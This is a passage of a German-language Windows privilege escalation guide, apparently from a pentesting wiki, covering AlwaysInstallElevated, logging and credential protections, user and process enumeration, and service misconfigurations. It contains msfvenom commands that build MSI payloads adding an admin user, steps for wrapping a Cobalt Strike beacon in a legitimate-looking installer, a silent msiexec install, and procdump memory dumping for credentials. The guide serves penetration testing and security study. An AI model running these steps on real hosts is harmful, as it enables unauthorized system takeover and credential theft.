Prüfe die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Impersonation-Levels der ausgewählten COM-Klasse. Der Logon-Typ und der Credential-Kontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als ein interaktiver Logon oder ein Logon mit neuen Anmeldedaten. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachte eine permissive Richtlinie oder eine passende ACL als Kandidaten für eine Überprüfung; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Ein Machine-Account-shadow-credential kann zu einem Maschinenticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt, zu einem separaten DCSync-Pfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine Meterpreter-Sitzung verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` aus PowerUp, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt ein vorkompiliertes MSI-Installationsprogramm, das zum Hinzufügen eines Benutzers/einer Gruppe auffordert (du benötigst also GIU-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um deine Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI Wrapper erstellst. Beachte, dass du auch eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.

{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erzeuge** mit Cobalt Strike oder Metasploit ein **neues Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende `C:\privesc` als Speicherort, wähle **place solution and project in the same directory** und klicke auf **Create**.
- Klicke so lange auf **Next**, bis du Schritt 3 von 4 erreichst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle das gerade erstellte Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere unter **Properties** den Wert **TargetPlatform** von **x86** zu **x64**.
  - Du kannst weitere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte Anwendung legitimer wirkt.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter **Custom Action Properties** den Wert **Run64Bit** zu **True**.
- Zum Schluss **erstellst du das Projekt**.
  - Falls die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass die Plattform auf x64 gesetzt ist.

### MSI-Installation

So führst du die **Installation** der schädlichen `.msi`-Datei **im Hintergrund** aus:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirus und Detektoren

### Überwachungseinstellungen

Diese Einstellungen legen fest, was **protokolliert** wird. Daher solltest du darauf achten.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: Es ist interessant zu wissen, wohin die Protokolle gesendet werden.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** dient der **Verwaltung lokaler Administrator-Kennwörter** und stellt sicher, dass jedes Kennwort auf in eine Domäne eingebundenen Computern **eindeutig, zufällig und regelmäßig aktualisiert** ist. Diese Kennwörter werden sicher in Active Directory gespeichert und können nur von Benutzern eingesehen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiv, werden **Kennwörter im Klartext in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA-Schutz

Ab **Windows 8.1** führte Microsoft einen erweiterten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **ihren Speicher auszulesen** oder Code einzuschleusen und so das System besser zu schützen.\
[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Es soll auf einem Gerät gespeicherte Anmeldedaten vor Bedrohungen wie Pass-the-Hash-Angriffen schützen. [**Weitere Informationen zu Credential Guard finden Sie hier.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Zwischengespeicherte Anmeldedaten

**Domänenanmeldedaten** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheitspaket authentifiziert werden, werden für diesen Benutzer typischerweise Domänenanmeldedaten eingerichtet.\
[**Weitere Informationen zu zwischengespeicherten Anmeldedaten**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegierte Gruppen

Wenn du **Mitglied einer privilegierten Gruppe bist, kannst du möglicherweise deine Privilegien erweitern**. Erfahre hier mehr über privilegierte Gruppen und wie du sie missbrauchen kannst, um deine Privilegien zu erweitern:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token-Manipulation

**Erfahre mehr** darüber, was ein **Token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Auf der folgenden Seite erfährst du, **welche Tokens interessant sind** und wie du sie missbrauchen kannst:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen

```bash
qwinsta
klist sessions
```

### Home-Verzeichnisse

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Kennwortrichtlinie

```bash
net accounts
```

### Inhalt der Zwischenablage abrufen

```bash
powershell -command "Get-Clipboard"
```

## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Überprüfe beim Auflisten der Prozesse zunächst, **ob sich Passwörter in der Befehlszeile des Prozesses befinden**.\
Prüfe, ob du **eine ausgeführte Binärdatei überschreiben kannst** oder Schreibberechtigungen für den Ordner der Binärdatei hast, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Prüfe immer, ob [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) laufen, da du sie zur Privilegieneskalation missbrauchen könntest.

Ein Debugger-Listener kann nur kurzzeitig aktiv sein. Dass er in einer einzelnen passiven Portaufnahme nicht erscheint, beweist daher nicht, dass er nie erreichbar war. Ordne jeden beobachteten Listener seiner PID, seinem Prozessbesitzer und der Möglichkeit des Benutzers mit geringeren Berechtigungen zu, ihn zu erreichen. Ein Anwendungsname oder Debug-Flag allein belegt keine Codeausführung über Benutzergrenzen hinweg. Beschränke routinemäßige Aufklärungsmaßnahmen auf passive Methoden und sende keine Debugger-Befehle.

**Berechtigungen der Prozess-Binärdateien prüfen**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort-Verzeichnisse für dynamische Präprozessoren

Snort 2 kann Shared Libraries aus einem `dynamicpreprocessor directory` laden, das in der mit `snort.exe -c <config>` ausgewählten Konfiguration angegeben ist. Wenn eine geplante Aufgabe oder ein Dienst Snort unter einem anderen Konto ausführt, überprüfe genau diese Konfiguration und die ACL des angegebenen Modulverzeichnisses. Wenn dein Token dort Dateien erstellen kann, kommt der Pfad für eine Prüfung auf code execution infrage, wenn die Aufgabe oder der Dienst das nächste Mal Module lädt. Überprüfe die effektiven Berechtigungen des Run-as-Kontos, die aktive Konfiguration, die Modulkompatibilität sowie etwaige Deny- oder Freigabebeschränkungen; ein beschreibbares Verzeichnis allein belegt keine Rechteausweitung. Die [Dokumentation zu Snorts dynamischen Präprozessoren](https://www.snort.org/documents/dpx-readme) beschreibt das Laden von Modulen zur Laufzeit.

### Privilegierter Webdienst mit beschreibbarem DocumentRoot

Vergleiche bei einer Windows-Apache-Installation den ausführbaren Pfad und das Run-as-Konto des Dienstes mit dem `DocumentRoot` in der aktiven `httpd.conf`. Bei einem herkömmlichen XAMPP-Layout solltest du `C:\xampp\apache\conf\httpd.conf` und die ACL des darin konfigurierten DocumentRoot überprüfen, häufig `C:\xampp\htdocs`. Wenn ein Benutzer mit geringeren Berechtigungen Dateien in diesem Verzeichnis erstellen kann, während Apache als `LocalSystem` läuft, kann serverseitige code execution die Berechtigungsgrenze des Hosts überschreiten. Vergewissere dich, dass der Dienst läuft, der genaue Pfad bereitgestellt wird und ein serverseitiger Handler den Dateityp verarbeitet; ein beschreibbares Verzeichnis belegt für sich genommen nur, dass Dateien erstellt werden können. Überprüfe die ACLs, ohne eine Testdatei zu schreiben:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Bei einer herkömmlichen WAMP-Installation verweist der Dienst möglicherweise auf eine versionierte `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (oder bei einem 32-Bit-Layout auf `C:\wamp\...`), wobei sich die Konfiguration daneben unter `conf\httpd.conf` und das standardmäßige Stammverzeichnis unter `C:\wamp64\www` oder `C:\wamp\www` befindet. Prüfe gemeinsam das genaue Dienstabbild, die Identität, unter der der Dienst ausgeführt wird, das effektive `DocumentRoot` (einschließlich der Expansion von `${INSTALL_DIR}` und virtueller Host-Überschreibungen) sowie die ACL des Stammverzeichnisses. Ein beschreibbares WAMP-Verzeichnis belegt nicht, dass Apache als `SYSTEM` läuft oder die übermittelte Datei ausführt. [Apache dokumentiert, wie ein Windows-Dienst seine Konfiguration auswählt](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Beschreibbares IIS-Stammverzeichnis und Netzwerkidentität des Anwendungspools

Ordne bei IIS ein beschreibbares physisches Verzeichnis einem **aktiven Standort/einer aktiven Anwendung** in `applicationHost.config` zu und ermittle den konfigurierten Pool sowie den serverseitigen Handler. In einem bereitgestellten Verzeichnis abgelegter Code wird nur dann als Pool ausgeführt, wenn IIS diesen Dateityp verarbeitet und die Route erreichbar ist. Prüfe die effektiven Berechtigungen des aktuellen Benutzers zum Erstellen von Dateien, den Laufzeitstatus der Site, den Handler und pfadspezifische Überschreibungen, bevor du ein beschreibbares Verzeichnis als Codeausführung wertest.

Die dynamische ASP.NET-Kompilierung eröffnet einen separaten Prüfpfad: generierte Dateien im Kompilierungsverzeichnis der Anwendung. Standardmäßig ist dies ein Verzeichnis namens `Temporary ASP.NET Files` unterhalb der entsprechenden .NET-Framework-Installation. Das `<compilation tempDirectory>` der Anwendung kann diesen Pfad jedoch ändern. [Microsoft dokumentiert den Speicherort und die anwendungsspezifischen Unterverzeichnisse](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) und [empfiehlt, Kompilierungsverzeichnisse zu isolieren, wenn sich Anwendungspools nicht gegenseitig vertrauen](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Kann ein Token mit geringeren Berechtigungen generierten Quellcode im **Cache der konkreten** Anwendung ändern, prüfe, ob diese Anwendung ihn unter einer privilegierteren [Worker-Prozessidentität](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) neu kompiliert. Eine Datei- oder Verzeichnis-ACL allein belegt keine Codeausführung: Ordne den Cache der aktiven Anwendung, dem effektiven Token und der ACL, den Kompilierungseinstellungen, der Prozessidentität und dem Zeitpunkt einer möglichen Neukompilierung zu. Prüfe Metadaten ausschließlich lesend; löse während der Erfassung keine Kompilierung aus und ändere keine Cache-Dateien.

Ein IIS-Pool, der als `ApplicationPoolIdentity` oder `NetworkService` konfiguriert ist, authentifiziert sich bei Domänenressourcen häufig mit dem **Computerkonto des Hosts**, obwohl sein lokales Token nur geringe Berechtigungen haben kann. `LocalSystem` verfügt lokal bereits über hohe Berechtigungen und verwendet im Netzwerk ebenfalls das Computerkonto; `LocalService` weist normalerweise anonyme Netzwerkanmeldeinformationen vor. Ein Pool vom Typ `SpecificUser` verwendet stattdessen das dafür konfigurierte Konto. [Microsoft dokumentiert diese Identitätstypen](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) sowie [die Netzwerkidentität von Anwendungspools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Eine nicht angegebene Identitätseinstellung kann die Pool-Standardeinstellungen übernehmen, die sich zwischen IIS-Versionen unterscheiden. Ermittle daher die effektive Konfiguration, statt anhand des Poolnamens zu raten. Erreicht die Codeausführung einen Pool mit der Netzwerkidentität des Computerkontos, prüfe die Verzeichnisberechtigungen **dieses konkreten Computers**. [DCSync](../active-directory-methodology/dcsync.md) erfordert Replikationsrechte auf dem Domänennamenskontext; ein Ticket des Computerkontos oder die Hostrolle allein belegt diese nicht. Bei passiver Enumeration sollten Konfiguration und ACLs geprüft werden, ohne Dateien hochzuladen, eine Netzwerkauthentifizierung auszulösen oder Tickets anzufordern.

Verfolge bei einem lesbaren ASP.NET-Handler, der einen Hilfsprozess startet, jeden aus einer Anfrage stammenden Wert durch Authentifizierung, Entschlüsselung, Validierung und Befehlserstellung. Ein Handler, der ein dekodiertes Token an `ProcessStartInfo("cmd", "/c ...")` anhängt, kann Shell-Metazeichen dazu verwenden, den Befehl zu ändern; [Microsoft dokumentiert die Sonderzeichen von `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Stelle fest, ob ein nicht vertrauenswürdiger Aufrufer den dekodierten Wert tatsächlich beeinflussen und den Handler erreichen kann. Ermittle anschließend die effektive Identität des Anwendungspools oder des impersonierten Benutzers sowie die Identität des Kindprozesses. Eine lesbare Quellcodezeile, ein localhost-Listener oder eine Schwäche im Tokenformat allein belegt keine Ausführung privilegierter Befehle. Prüfe Quellcode und Poolkonfiguration, ohne während der passiven Enumeration gefälschte Anfragen zu senden oder den Hilfsprozess auszuführen.

Bei einem PHP-Dienst unter Windows kann ein durch die Anfrage gesteuerter Pfad, der an [`include` oder `require`](https://www.php.net/manual/en/function.include.php) übergeben wird, eine PHP-Datei auswerten, die ein Benutzer mit geringeren Berechtigungen beschreiben kann; die Ausführung erfolgt dann mit der Identität des Workers. Bestätige, dass die Anfrage diese Anweisung erreichen kann, der aufgelöste Pfad auf eine Datei verweist, die der Benutzer mit geringeren Berechtigungen ändern und der Worker lesen kann, geltende PHP-Pfadbeschränkungen das Include zulassen und der Worker tatsächlich mit höheren Berechtigungen läuft. Ein Loopback-Listener oder eine beschreibbare Datei allein belegt diese Angriffskette nicht. Prüfe Quellcode, Dienstidentität und Datei-ACLs, ohne während der passiven Enumeration den Endpunkt aufzurufen.

### Speicher-Passwortsuche

Mit **procdump** aus den Sysinternals kannst du einen Speicherauszug eines laufenden Prozesses erstellen. Bei Diensten wie FTP befinden sich die **Anmeldeinformationen im Klartext im Speicher**. Versuche, den Speicher auszulesen und die Anmeldeinformationen zu finden.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: „Windows-Hilfe und Support“ (Windows + F1), nach „Eingabeaufforderung“ suchen, auf „Klicken, um die Eingabeaufforderung zu öffnen“ klicken

### Import privilegierter Projektdateien

Eine Anwendung, die Projekte automatisch aus einem Drop-Verzeichnis öffnet, in das ein Benutzer mit niedrigeren Rechten schreiben kann, überschreitet eine Eingabe-Vertrauensgrenze unter dem Konto des Importers. Prüfen Sie den **genauen beschreibbaren Pfad**, den Prozess oder Task, der ihn öffnet, dessen effektive Identität und den Parser-Build. Ein [historisches Problem beim Öffnen/Wiederherstellen von Ghidra-Projekten](https://github.com/NationalSecurityAgency/ghidra/issues/71) ermöglichte externe XML-Entitäten in Projektmetadaten; eine Netzwerkentität unter Windows konnte eine Authentifizierung durch das importierende Konto auslösen, sofern die [Richtlinie für ausgehendes SMB und NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) dies zuließ. Das ist ein Hinweis auf mögliche Offenlegung von Anmeldedaten, kein unmittelbarer Administratorzugriff: Die Antwort muss über einen separaten autorisierten oder verwundbaren Pfad nutzbar sein, und aktuelle Builds müssen anhand ihres tatsächlichen Patch-Status bewertet werden. Öffnen Sie bei der passiven Enumeration kein präpariertes Projekt; prüfen Sie den Import-Workflow und die ACLs.

## Dienste

Das Recht [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) für das Service Control Manager (SCM)-Objekt ist von den Rechten für einen bestehenden Dienst getrennt. Eine erfolgreiche, nur lesende [`OpenSCManager`-Zugriffsanforderung](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) für dieses Recht ist ein Prüfhinweis, kein Beweis dafür, dass ein neuer Dienst ausgeführt werden kann. [`CreateService` gibt ein Handle zurück](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), das bei der Erstellung die angeforderten Dienstzugriffsrechte enthält; ein späteres erneutes Öffnen des Dienstes führt eine separate Zugriffskontrolle durch und kann fehlschlagen, selbst wenn das ursprüngliche Handle verwendet werden könnte. Prüfen Sie separat das effektive lokale oder Remote-Token, die gewährten Handle-Rechte, das Dienstkonto, die Start-Richtlinie und den ausführbaren Pfad. Erstellen oder starten Sie während der passiven Enumeration keinen Dienst.

Prüfen Sie bei einem Remote-Dienstinstallationspfad diese SCM-Rechte zusammen mit einer Freigabe auf dem Ziel, in die **dieselbe Netzwerk-Anmeldung** schreiben kann, der zugrunde liegenden NTFS-ACL und einem lokalen ausführbaren Pfad, den das Dienstkonto ausführen kann. Ein Nicht-Admin-Konto kann diese Grenze überschreiten, wenn ungewöhnlich weitreichende SCM-Rechte und der Pfad zum Ablegen der Datei beide vorhanden sind; eine administrative Freigabe ist keine zwingende Voraussetzung. Schreibzugriff auf eine Freigabe allein oder ein Hinweis auf das Erstellungsrecht für Dienste im SCM allein belegt nicht, dass der neue Dienst mit einer höheren Identität gestartet werden kann.

Ein bestehender Dienst kann beim Start, Herunterfahren oder bei einem anderen Lebenszyklusereignis ein Hilfsprogramm aufrufen, selbst wenn dieses nicht in seinem `ImagePath` aufgeführt ist. Wird der Name des Hilfsprogramms in ein Verzeichnis aufgelöst, in das ein Benutzer mit niedrigeren Rechten schreiben kann, und läuft der Dienst unter einer höheren Identität, kann eine fehlende Hilfsprogrammdatei unter bestimmten Bedingungen ersetzt werden. Bestätigen Sie den **tatsächlichen Dienstcode oder den dokumentierten Aufruf des Hilfsprogramms**, den aufgelösten ausführbaren Pfad und die Suchreihenfolge, die Berechtigungen zum Erstellen von Verzeichnissen, die Dienstidentität und einen verfügbaren Lebenszyklus-Trigger. Ein beschreibbares Dienstverzeichnis oder eine fehlende Datei allein belegt nicht, dass der Dienst die Datei lädt; starten oder stoppen Sie den Dienst bei einer passiven Prüfung nicht.

Für einen bestehenden Dienst erlaubt [`SERVICE_START` das Übergeben von Argumenten an `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); dieses Recht ist von [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) getrennt. Prüfen Sie den Dienstcode oder die dokumentierte Schnittstelle, bevor Sie das Startrecht als mehr als ein Steuerungsrecht einstufen. Wenn der Dienst ein vom Aufrufer gewähltes Argument als Protokoll- oder Exportpfad verwendet, prüfen Sie die Dienstidentität, den genauen Ablauf von Argument zu Schreibvorgang, Pfadbeschränkungen und die Berechtigungen der **erstellten Datei**. Ein Schreibvorgang in ein geschütztes Verzeichnis kann nur dann zur Rechteausweitung führen, wenn ein separater privilegierter Verbraucher oder Loader diese Datei akzeptiert; ein beschreibbares Protokoll oder ein Startrecht allein reichen nicht aus. Bei der passiven Bestandsaufnahme sollte der Dienst weder gestartet noch eine Testdatei erstellt werden.

Bei einem NSClient++-Monitoring-Agenten ist eine lesbare `nsclient.ini` ein **Hinweis für eine Konfigurationsprüfung**: Sie kann Web-Anmeldedaten enthalten, während `boot.ini` die Konfiguration an einen anderen Speicherort umleiten kann. Prüfen Sie das tatsächliche Dienstkonto, den WEB-Listener und die Zugriffsrichtlinie sowie, ob die authentifizierte Rolle Einstellungen oder Skripte ändern kann. Eine privilegierte Ausführung erfordert zusätzlich `CheckExternalScripts` (oder einen anderen aktivierten Ausführungspfad), ein wirksames Recht zum Registrieren oder Ändern eines Befehls und einen Trigger, der ihn unter der Dienstidentität ausführt. Ein nur an Loopback gebundener Listener kann für einen lokalen Benutzer dennoch erreichbar sein, doch Dateipfad, Passwort oder Listener allein belegen diese Rechte nicht. Prüfen Sie Metadaten und Berechtigungen, ohne Geheimnisse anzuzeigen oder während der passiven Enumeration die Web-API aufzurufen. Siehe [NSClient++-Dateiaufbau](https://nsclient.org/docs/concepts/file-layout/), [Sicherheitshinweise zu Web und Skripten](https://nsclient.org/docs/setup/securing/) und [Konfiguration externer Skripte](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Bei einem Dienst, dessen `ImagePath` `nssm.exe` lautet, prüfen Sie das tatsächliche Ausführungskonto des Dienstes und dessen Wert `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM speichert dort die untergeordnete Anwendung](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), während `AppDirectory` das konfigurierte Arbeitsverzeichnis angibt. Prüfen Sie die untergeordnete ausführbare Datei und die ACLs ihrer übergeordneten Verzeichnisse, bevor Sie die Berechtigungen des Wrappers als vollständige Dienstgrenze betrachten. Ein von diesem untergeordneten Prozess bereitgestellter lokaler WCF- oder SOAP-Endpunkt ist ein separater Prüfhinweis: Bestätigen Sie, dass der Listener für den Benutzer mit niedrigeren Rechten erreichbar ist, der konkrete Vorgang dessen Eingabe akzeptiert und der untergeordnete Dienstprozess den unsicheren Vorgang unter einer höheren Identität ausführt. Das Dienstkonto, eine Endpunkt-URL oder ein beschreibbarer Pfad allein beweist keine Rechteausweitung; rufen Sie bei der passiven Enumeration keine Dienstvorgänge auf.

Verfolgen Sie bei einem benutzerdefinierten WCF-Vorgang eine vom Aufrufer kontrollierte Zeichenfolge bis zu einem PowerShell-Runspace. [`Pipeline.Commands.AddScript` fügt Skripttext hinzu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), und [`Pipeline.Invoke` führt die Pipeline aus](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ein [`netTcpBinding` mit Windows-Transportanmeldedaten](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifiziert den Client, doch die Berechtigung zum Aufrufen dieses **bestimmten** Vorgangs und die effektive Identität des Runspaces müssen separat geprüft werden. Ein Pfad von der Eingabe eines Aufrufers mit niedrigeren Rechten zu `AddScript` unter einer höheren Dienstidentität bildet eine Grenze für Codeausführung; ein lauschender Port, ein authentifizierter Client oder eine ungenutzte Methode in einer nicht zugehörigen Assembly allein ist kein Beweis. Prüfen Sie den bereitgestellten Dienst, den Vertrag, die Autorisierung und die Identitätswechsel-Einstellungen statisch, ohne den Endpunkt während der Enumeration aufzurufen.

Service Triggers ermöglichen es Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (Aktivität an Named Pipes/RPC-Endpunkten, ETW-Ereignisse, IP-Verfügbarkeit, Geräteanschluss, GPO-Aktualisierung usw.). Auch ohne SERVICE_START-Rechte können privilegierte Dienste oft durch das Auslösen ihrer Trigger gestartet werden. Techniken zur Enumeration und Aktivierung finden Sie hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio-Dienst für die Diagnosesammlung

Visual Studio-Installationen mit C/C++-Tools können `VSStandardCollectorService150` enthalten, einen Diagnosedienst, der so konfiguriert ist, dass er als `LocalSystem` ausgeführt wird. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) nutzte eine Junction und eine Race Condition mit einem Object-Manager-Link, um das Zurücksetzen einer Dienst-DACL umzuleiten. Für die demonstrierte Rechteausweitung war außerdem ein nutzbarer Reparaturpfad des Visual Studio Setup WMI Provider MSI sowie dessen Ziel `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` erforderlich. Die Komponente wurde im Januar 2024 behoben.

Prüfen Sie bei der passiven Triage das Konto und den Binärpfad dieses einen Dienstes, kontrollieren Sie, ob der Setup-WMI-Compilerpfad vorhanden ist, und verifizieren Sie den Patch-Status der installierten Komponente. Ein Diensteintrag, eine Visual-Studio-Produktversion oder eine Compilerdatei allein belegt nicht, dass der Host verwundbar ist. Für die Prüfung muss der Dienst weder gestartet noch eine Reparatur ausgeführt werden.

Liste der Dienste abrufen:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Berechtigungen

Mit **sc** kannst du Informationen über einen Dienst abrufen.

```bash
sc qc <service_name>
```

Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
